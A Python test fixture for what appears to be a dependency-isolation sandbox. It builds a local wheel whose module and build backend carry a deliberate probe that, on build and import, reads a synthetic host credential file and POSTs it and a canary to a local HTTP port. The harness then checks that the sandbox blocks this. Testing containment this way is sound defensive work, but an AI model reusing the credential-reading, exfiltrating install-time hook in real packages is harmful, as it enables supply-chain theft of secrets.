"""Executing local dependency fixture for the shared product demo.

No registry package is claimed to be safe: this is explicitly reviewed local
source with an empty registry/build graph. The real local-wheel admission,
assessment, publication and on-use source binding remain enabled.
"""
import copy
import json
from pathlib import Path
import time

from evidence_io import digest, load, require, save

PROJECT = 'dependency-demo'
CANARY = 'SYNTHETIC_AVAILABLE_TRANSFER_CANARY'
SECRET = 'SYNTHETIC_HOST_CREDENTIAL_NOT_A_REAL_SECRET'
INVOICES = [{'quantity': 2, 'cents': 1250}, {'quantity': 3, 'cents': 700}]

PROBE = r'''
import http.client,json,os,pathlib,subprocess,sys,time
def attempt():
    time.sleep(.6)  # bounded observation window; included in demo timing
    row={'pid':os.getpid(),'ppid':os.getppid(),'route':__name__}
    try:
        body=pathlib.Path(SECRET_PATH).read_text()
        row['read']='obtained'
    except OSError as exc:
        body=None
        row['read']=type(exc).__name__
    for name,value in [('secret',body),('canary',CANARY)]:
        if value is None: continue
        try:
            connection=http.client.HTTPConnection('127.0.0.1',PORT,timeout=.3)
            connection.request('POST','/'+name,value.encode())
            response=connection.getresponse(); response.read(); connection.close()
            row[name+'_send']=response.status
        except OSError as exc:
            row[name+'_send']=type(exc).__name__
    print('DEPENDENCY_ATTEMPT '+json.dumps(row,sort_keys=True),flush=True)
    return row
if VARIANT != 'clean':
    result=attempt()
    if __name__ != '__probe_child__':
        subprocess.run([sys.executable,'-I','-S','-c',
            "exec("+repr(pathlib.Path(__file__).read_text())+",{'__name__':'__probe_child__'})"],check=True)
    if VARIANT == 'abort' and result['read'] != 'obtained':
        raise RuntimeError('Dependency deliberately aborts after denied read')
def total(rows):
    return sum(row['quantity']*row['cents'] for row in rows)
'''

BACKEND = r'''
import base64,hashlib,pathlib,zipfile
def get_requires_for_build_wheel(config_settings=None):
    return []
def build_wheel(wheel_directory,config_settings=None,metadata_directory=None):
    source=pathlib.Path('src/invoice_dep/__init__.py')
    exec(source.read_text(),{'__name__':'invoice_build','__file__':str(source.resolve())})
    files={
        'invoice_dep/__init__.py':source.read_bytes(),
        'invoice_dep-1.0.dist-info/METADATA':b'Metadata-Version: 2.1\nName: invoice-dep\nVersion: 1.0\n\n',
        'invoice_dep-1.0.dist-info/WHEEL':b'Wheel-Version: 1.0\nGenerator: reviewed-demo\nRoot-Is-Purelib: true\nTag: py3-none-any\n\n'}
    records=''.join(n+',sha256='+base64.urlsafe_b64encode(hashlib.sha256(b).digest()).decode().rstrip('=')+','+str(len(b))+'\n' for n,b in files.items())
    files['invoice_dep-1.0.dist-info/RECORD']=(records+'invoice_dep-1.0.dist-info/RECORD,,\n').encode()
    name='invoice_dep-1.0-py3-none-any.whl'
    with zipfile.ZipFile(pathlib.Path(wheel_directory)/name,'w') as wheel:
        for name_in_wheel,data in files.items(): wheel.writestr(name_in_wheel,data)
    return name
'''

APP = '''import invoice_dep,json,pathlib
assert invoice_dep.__file__ == '/python-packages/invoice_dep/__init__.py', invoice_dep.__file__
rows=json.loads(pathlib.Path('/target/app/invoices.json').read_text())
result={'invoice_total_cents':invoice_dep.total(rows),'invoice_lines':len(rows)}
pathlib.Path('/target/out/invoices.json').write_text(json.dumps(result,sort_keys=True)+'\\n')
print('INVOICE_APPLICATION '+json.dumps(result,sort_keys=True))
'''


def expected_invoice():
    # Independent observer arithmetic: expand quantities instead of calling dependency.
    return {'invoice_total_cents': sum(sum([r['cents']] * r['quantity']) for r in INVOICES),
            'invoice_lines': len(INVOICES)}


def module_source(secret, port, variant):
    require(variant in ('clean', 'tolerant', 'abort'), 'Unknown dependency variant')
    return ('SECRET_PATH=' + repr(str(secret)) + '\nPORT=' + repr(port) + '\nCANARY=' + repr(CANARY) +
            '\nVARIANT=' + repr(variant) + '\n' + PROBE)


def fixture(folder, port, variant):
    from ptw.evidence_storage import DEFAULT
    from ptw.policy import approve, compile_policy, digest as policy_digest
    from ptw.python_local import describe_source
    from ptw.python_runtime import identify
    from ptw.setup_templates import template
    from ptw.store import Store
    repo = folder / 'repo'
    for name in ('src/invoice_dep', 'backend', 'app', 'out'):
        (repo / name).mkdir(parents=True)
    secret = folder / 'host-credentials/token.txt'
    secret.parent.mkdir()
    secret.write_text(SECRET)
    (folder / 'sibling.txt').write_text('UNRELATED_PROJECT_UNCHANGED\n')
    (repo / 'src/invoice_dep/__init__.py').write_text(module_source(secret, port, variant))
    (repo / 'backend/backend.py').write_text(BACKEND)
    (repo / 'pyproject.toml').write_text('[project]\nname="invoice-dep"\nversion="1.0"\n'
        '[build-system]\nrequires=[]\nbuild-backend="backend"\nbackend-path=["backend"]\n')
    (repo / 'app/main.py').write_text(APP)
    save(repo / 'app/invoices.json', INVOICES)
    catalog = [{'id': 'invoice', 'argv': ['/usr/bin/python3', '-B', '/target/app/main.py'],
        'resources': ['src', 'backend', 'pyproject.toml', 'app', 'out'], 'timeout_seconds': 15}]
    policy, inv = template(repo, PROJECT, 'Build invoice summary; no host credentials or publication',
        {p: 'tree' for p in ('src', 'backend', 'app', 'out')}, ['pyproject.toml'], catalog, [], 1, 3)
    source_resources = [k for k, v in inv['resources'].items() if v['path'] in ('src', 'backend', 'pyproject.toml')]
    source = describe_source(inv, source_resources, identity='invoice', allow_build=True)
    policy['project']['python_runtime'] = {**identify('/usr/bin/python3'), 'requires_python': ''}
    policy['project']['python_dependencies'] = {'inputs': {}, 'pins': [], 'artifacts': [], 'sources': [source]}
    policy['project']['audit'] = copy.deepcopy(DEFAULT)
    bundle = approve(policy, inv, policy_digest(compile_policy(policy, inv)), 'scripted local-source fixture operator')
    save(folder / 'approved.json', bundle)
    store = Store(folder / 'controller')
    store.activate(bundle)
    actor = store.register(PROJECT, 'work')
    save(folder / 'actor.json', {k: v for k, v in actor.items() if k != 'token'})
    return store, actor, bundle, secret


def run_protected(folder, port, variant='tolerant'):
    """Native prerequisite milestone, not yet a three-arm demo acceptance result."""
    from demo_namespace import observe, verify
    from ptw.package_evidence import EvidenceError
    from ptw.python_local import install_wheel
    from ptw.supervisor import Supervisor
    from ptw.workflow import dispatch
    from ptw.workspace import request
    folder.mkdir()
    started = time.monotonic()
    save(folder / 'attempt.json', {'case': variant, 'complete': False, 'started_epoch': time.time()})
    store = None
    try:
        store, actor, bundle, secret = fixture(folder, port, variant)
        source = folder / 'repo/src/invoice_dep/__init__.py'
        sibling = digest(folder / 'sibling.txt')
        with observe(store, PROJECT, secret, '/target/source/src/invoice_dep/__init__.py', digest(source), folder / 'build-observer'):
            try:
                package = install_wheel(store, actor['token'], 'invoice')
            except EvidenceError as exc:
                save(folder / 'build-error.json', {'type': type(exc).__name__, 'message': str(exc)})
                if variant != 'abort':
                    raise
                package = None
        if variant != 'clean':
            verify(folder / 'build-observer', secret=secret, marker='/target/source/src/invoice_dep/__init__.py',
                   expected=digest(source), sessions={actor['session']})
        if variant == 'abort':
            require(package is None, 'Aborting dependency unexpectedly completed')
            with store.locked() as db:
                require(db.execute('SELECT count(*) FROM package_sets').fetchone()[0] == 0,
                        'Aborted build published a package set')
            outcome = {'case': variant, 'result': 'safe-incompletion', 'application': None}
        else:
            save(folder / 'package.json', package)
            with store.locked() as db:
                row = dict(db.execute('SELECT * FROM package_sets WHERE id=?', (package['package_set'],)).fetchone())
            save(folder / 'local-install.json', {k: json.loads(row[k]) for k in ('manifest', 'local_source')})
            with observe(store, PROJECT, secret, '/target/src/invoice_dep/__init__.py', digest(source), folder / 'import-observer'):
                result = dispatch(store, actor, 'invoice', request('run', 'invoice',
                    content=json.dumps({'package_sets': [package['package_set']]})))
            save(folder / 'action.json', result)
            require(result['allowed'] and result['exit_code'] == 0, 'Installed invoice application failed')
            if variant != 'clean':
                verify(folder / 'import-observer', secret=secret, marker='/target/src/invoice_dep/__init__.py',
                       expected=digest(source), sessions={actor['session']})
            actual = load(folder / 'repo/out/invoices.json')
            require(actual == expected_invoice(), 'Independent invoice oracle failed')
            outcome = {'case': variant, 'result': 'completed', 'application': actual}
        require(digest(folder / 'sibling.txt') == sibling and secret.read_text() == SECRET, 'Unrelated fixture changed')
        require(store.status(PROJECT)['violations'] == 0, 'OS/build failure counted as misconduct')
        save(folder / 'audit.json', store.audit_export(PROJECT))
        save(folder / 'status.json', store.status(PROJECT))
        outcome.update(seconds=time.monotonic() - started, model_calls=0, scripted_operator_approvals=1,
                       complete=True, ended_epoch=time.time())
        save(folder / 'outcome.json', outcome)
        return outcome
    except BaseException as exc:
        save(folder / 'failed.json', {'type': type(exc).__name__, 'complete': False, 'ended_epoch': time.time()})
        raise
    finally:
        if store is not None:
            store.stop(PROJECT)
            Supervisor(store).reconcile()
